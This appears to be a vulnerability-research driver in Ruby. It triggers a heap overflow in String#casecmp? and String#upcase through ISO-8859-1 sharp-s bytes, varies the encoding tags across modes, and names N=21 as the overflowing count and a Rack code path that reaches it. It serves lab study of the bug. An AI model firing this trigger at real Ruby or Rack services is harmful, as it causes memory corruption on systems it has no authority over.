# W365: encoding-tag boundary for String#casecmp? (CVE-2026-132825).
# str_casecmp_p (string.c:4369-4375) gates on rb_enc_compatible, then folds
# each operand with its own encoding. The ISO-8859-1 sharp-s operand reaches
# the one-byte case_map overflow. This driver asks whether other tags on the
# same attacker bytes can reach it too.
#
#   latin_arg      7-bit ASCII-8BIT receiver vs ISO-8859-1 0xDF operand (positive)
#   utf8_invalid   7-bit ASCII-8BIT receiver vs UTF-8-tagged 0xDF operand
#   utf8_valid     7-bit ASCII-8BIT receiver vs valid UTF-8 U+0130 operand
#                  (U+0130 folds to 'i' + U+0307: 2 source bytes -> 3 output)
#   usascii_arg    7-bit ASCII-8BIT receiver vs US-ASCII-tagged 0xDF operand
#   ascii_arg      7-bit ASCII-8BIT receiver vs ASCII-8BIT 0xDF operand
#
# W373 adds the same tags as direct String#upcase operands (the operation used
# by Rack::MethodOverride): prefix any mode with `upcase_`. N=21 is the odd
# sharp-s count that overflows the len+20 single-byte buffer; N=20 is clean.
#
# Run: lab/build/plain/ruby-3.4.12-plain/bin/ruby <this> 21 upcase_latin
n = (ARGV[0] || 27).to_i
mode = ARGV[1] || 'latin_arg'
upcase_mode = mode.start_with?('upcase_')

receiver = ("a" + "s" * 54).b
sharp = ("a".b + "\xDF".b * n)
i_dot = ("a".b + ("\xC4\xB0".b * n)).force_encoding(Encoding::UTF_8)

arg = case mode
      when 'latin_arg',        'upcase_latin'        then sharp.dup.force_encoding(Encoding::ISO_8859_1)
      when 'utf8_invalid',     'upcase_utf8_invalid' then sharp.dup.force_encoding(Encoding::UTF_8)
      when 'utf8_valid',       'upcase_utf8_valid'   then i_dot
      when 'usascii_arg',      'upcase_usascii'      then sharp.dup.force_encoding(Encoding::US_ASCII)
      when 'ascii_arg',        'upcase_ascii'        then sharp.dup
      else abort "unknown mode #{mode}"
      end

begin
  result = (upcase_mode ? arg.upcase : receiver.casecmp?(arg)).inspect
rescue => e
  result = "error:#{e.class}:#{e.message}"
end
op = upcase_mode ? 'upcase' : 'casecmp?'
print "N=#{n} mode=#{mode} op=#{op} enc1=#{receiver.encoding} enc2=#{arg.encoding} "
print "valid2=#{arg.valid_encoding? ? 'v' : '?'} len2=#{arg.bytesize} result=#{result}\n"
